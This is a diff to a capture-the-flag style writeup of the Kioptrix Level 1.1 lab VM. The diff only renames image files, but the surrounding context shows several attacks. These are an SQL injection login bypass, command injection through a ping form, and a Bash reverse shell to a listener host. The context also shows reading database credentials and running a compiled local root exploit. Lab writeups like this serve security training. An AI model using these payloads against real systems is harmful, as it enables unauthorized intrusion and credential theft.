@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Kioptrix: Level 1.1 (#2)](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix2/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix2/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -112,15 +112,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 admin/' or 1=1 -- -
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix2/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix2/screenshot01.png.webp)  
 
-![writeup.enumeration.steps.2.2](/static/files/posts_vulnhub_kioptrix2/screenshot02.png)  
+![writeup.enumeration.steps.2.2](/static/files/posts_vulnhub_kioptrix2/screenshot02.png.webp)  
 
 3\. Once logged in, we find a web administration console with a text input field to accept an IP address. The web console will `POST` this IP to the `pingit.php` script that runs a `ping` query against this IP and shows result:  
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_kioptrix2/screenshot03.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_kioptrix2/screenshot03.png.webp)  
 
-![writeup.enumeration.steps.3.2](/static/files/posts_vulnhub_kioptrix2/screenshot04.png)  
+![writeup.enumeration.steps.3.2](/static/files/posts_vulnhub_kioptrix2/screenshot04.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -141,18 +141,18 @@ admin/' or 1=1 -- -
 8.8.8.8 ; uname -a
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_kioptrix2/screenshot05.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_kioptrix2/screenshot05.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_kioptrix2/screenshot06.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_kioptrix2/screenshot06.png.webp)  
 
 2\. We can also run commands without providing the IP which makes it a little faster to get results back:  
 ```
 ; uname -a
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_kioptrix2/screenshot07.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_kioptrix2/screenshot07.png.webp)  
 
-![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_kioptrix2/screenshot08.png)  
+![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_kioptrix2/screenshot08.png.webp)  
 
 3\. We try to use Python to get a reverse shell connection but it fails. We fallback on Bash reverse shell and it works:  
 ```
@@ -160,11 +160,11 @@ nc -nlvp 443
 ; bash -i >& /dev/tcp/192.168.92.183/443 0>&1
 ```
 
-![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_kioptrix2/screenshot09.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_kioptrix2/screenshot09.png.webp)  
 
-![writeup.exploitation.steps.3.2](/static/files/posts_vulnhub_kioptrix2/screenshot10.png)  
+![writeup.exploitation.steps.3.2](/static/files/posts_vulnhub_kioptrix2/screenshot10.png.webp)  
 
-![writeup.exploitation.steps.3.3](/static/files/posts_vulnhub_kioptrix2/screenshot11.png)  
+![writeup.exploitation.steps.3.3](/static/files/posts_vulnhub_kioptrix2/screenshot11.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -196,7 +196,7 @@ head /var/www/html/index.php
   mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_kioptrix2/screenshot12.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_kioptrix2/screenshot12.png.webp)  
 
 2\. We find web application password hashes for users `admin` and `john` from the `users` table within `webapp` database:  
 ```
@@ -207,16 +207,16 @@ mysql -h localhost -u john -p
   select * from users;
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_kioptrix2/screenshot13.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_kioptrix2/screenshot13.png.webp)  
 
-![writeup.privesc.steps.2.2](/static/files/posts_vulnhub_kioptrix2/screenshot14.png)  
+![writeup.privesc.steps.2.2](/static/files/posts_vulnhub_kioptrix2/screenshot14.png.webp)  
 
 3\. From the `/etc/redhat-release` file we find that the target system is `CentOS release 4.5 (Final)`:  
 ```
 cat /etc/redhat-release
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_kioptrix2/screenshot15.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_kioptrix2/screenshot15.png.webp)  
 
 4\. We find an exploit for this CentOS release using `searchsploit`:  
 ```
@@ -233,11 +233,11 @@ gcc -o 9542 9542.c
 ./9542
 ```
 
-![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_kioptrix2/screenshot16.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_kioptrix2/screenshot16.png.webp)  
 
-![writeup.privesc.steps.5.2](/static/files/posts_vulnhub_kioptrix2/screenshot17.png)  
+![writeup.privesc.steps.5.2](/static/files/posts_vulnhub_kioptrix2/screenshot17.png.webp)  
 
-![writeup.privesc.steps.5.3](/static/files/posts_vulnhub_kioptrix2/screenshot18.png)  
+![writeup.privesc.steps.5.3](/static/files/posts_vulnhub_kioptrix2/screenshot18.png.webp)  
 
 ## Loot
 ### Hashes
